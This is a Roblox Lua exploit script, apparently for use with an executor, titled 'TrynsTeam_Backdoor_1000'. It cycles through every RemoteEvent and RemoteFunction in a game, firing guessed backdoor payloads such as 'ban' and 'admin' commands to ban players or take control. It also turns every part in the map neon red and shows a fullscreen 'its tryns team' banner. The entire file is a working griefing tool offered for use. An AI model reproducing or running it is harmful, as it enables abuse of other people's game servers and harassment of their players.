
getgenv().TrynsTeam = getgenv().TrynsTeam or {}TrynsTeam.BackdoorFunctions = {}

payloadBases = {
    "ban", "kick", "banplayer", "adminban", "modban", "serverban",
 "texture", "decal", "material", "colorchange", "neon", "invisible", "banner", "overlay", "fullscreen", "guihack", "trynsteam", "face", "command", "remote", "admin", "give", "teleport", "freeze", "team",
 "health", "speed", "jump", "god", "whitelist", "unban", "hint"
}

function makeBackdoorFunc(id)
    return function(target, extra)
        spawn(function()
            pcall(function()
                descendants = game:GetDescendants() for i = 1, #descendants do obj = descendants[i]
 if obj:IsA("RemoteEvent") then pay = payloadBases[(id % #payloadBases) + 1] .. tostring(id)
 obj:FireServer(pay, target or "all", extra or true, id)
 obj:FireServer("TrynsBackdoorBan", id, target)
 obj:FireServer({cmd = "ban", func = id, t = target, group = "trynsteam"})
                    elseif obj:IsA("RemoteFunction") then obj:InvokeServer("backdoor" .. id, target, extra)
                        obj:InvokeServer(payloadBases[(id % 10) +1], id)
                    end end
                -- Бан логика для id 1-250
                if id <= 250 then
 pcall(function()
                        players = game:GetService("Players"):GetPlayers() for _, plr in pairs(players) do if target == "all" or plr.Name == target or tostring(plr.UserId) == tostring(target) then                                -- Попытка бана через возможные ремоуты уже сделана выше                            end
                        end
                    end)
 end                -- Смена текстур для id 251-500 if id > 250 and id <= 500 then
                    pcall(function()                        for _, part in pairs(workspace:GetDescendants()) do
                            if part:IsA("BasePart") then                                part.BrickColor = BrickColor.new("Really red")
                                part.Material = Enum.Material.Neon
                                if id % 2 == 0 then
                                    part.Transparency = 0.5
                                end decal = Instance.new("Decal")
                                decal.Texture = "rbxassetid://123456" -- замените на нужный                                decal.Parent = part
                            end end
                    end)
                end
                -- Полноэкранный баннер для id 501-750
                if id > 500 and id <= 750 then
                    pcall(function()
                        player = game:GetService("Players").LocalPlayer
                        if player and player:FindFirstChild("PlayerGui") then
                            screenGui = Instance.new("ScreenGui")
                            screenGui.Name = "TrynsBanner" .. id
                            screenGui.IgnoreGuiInset = true
                            screenGui.DisplayOrder =999999                            screenGui.ResetOnSpawn = false
                            screenGui.Parent = player.PlayerGui                            frame = Instance.new("Frame")                            frame.Size = UDim2.new(1,0, 1, 0)
                            frame.BackgroundColor3 = Color3.new(0,0,0)
                            frame.BorderSizePixel = 0
                            frame.Parent = screenGui textLabel = Instance.new("TextLabel")
                            textLabel.Size = UDim2.new(1, 0, 0.3, 0)
                            textLabel.Position = UDim2.new(0, 0,0.35, 0)
                            textLabel.BackgroundTransparency = 1
                            textLabel.Text = "its tryns team"
                            textLabel.TextColor3 = Color3.new(1, 0, 0)
                            textLabel.TextScaled = true
 textLabel.Font = Enum.Font.GothamBold textLabel.Parent = frame
                            imageLabel = Instance.new("ImageLabel")
                            imageLabel.Size = UDim2.new(0.3, 0, 0.3, 0)
                            imageLabel.Position = UDim2.new(0.35, 0, 0.1, 0)
                            imageLabel.BackgroundTransparency = 1
                            imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=USERID_HERE&w=420&h=420"
 imageLabel.Parent = frame end
                    end)
                end
            end)
        end)
    end
end

for i = 1,1000 do TrynsTeam.BackdoorFunctions[i] = makeBackdoorFunc(i)
end

function TrynsTeam.ExecuteAllSilent()    for i = 1,1000,10 do spawn(function()
            TrynsTeam.BackdoorFunctions[i]("all")
        end)
    end
end

function TrynsTeam.Execute(num, ...)
    if TrynsTeam.BackdoorFunctions[num] then
        TrynsTeam.BackdoorFunctions[num](...)
    endend

TrynsTeam.Version = "TrynsTeam_Backdoor_1000_NoDDoS_2025"
TrynsTeam.Author = "tryns team"
-- Замените USERID_HERE в баннер функциях на ваш UserId аккаунта для лица
